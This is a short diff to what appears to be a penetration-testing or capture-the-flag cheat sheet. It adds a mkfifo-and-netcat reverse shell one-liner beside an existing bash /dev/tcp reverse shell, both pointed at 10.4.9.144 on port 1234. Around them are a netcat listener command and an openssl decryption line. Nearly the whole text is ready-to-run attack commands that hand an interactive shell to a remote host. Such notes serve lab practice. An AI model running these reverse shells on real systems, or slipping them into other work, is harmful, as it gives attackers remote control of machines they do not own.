@@ -135,6 +135,8 @@ openssl rsautl -decrypt -inkey private.key -in note2_encrypted.txt -out file.txt
 
 bash -i >& /dev/tcp/10.4.9.144/1234 0>&1
 
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.9.144 1234 >/tmp/f
+
 ## listen for reverse shell
 
 netcat -lvnp 1234 (or nc)
